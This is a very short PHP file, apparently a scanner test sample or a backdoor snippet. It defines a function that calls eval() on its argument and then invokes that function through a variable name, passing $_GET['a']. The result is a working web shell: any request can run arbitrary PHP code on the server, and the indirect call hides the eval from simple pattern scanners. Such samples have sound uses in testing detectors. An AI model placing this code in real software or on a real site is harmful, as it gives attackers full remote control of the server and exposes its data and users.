<?php

function some_function($arg) {
    eval($arg);
}

$f = "some_function";
$f($_GET["a"]);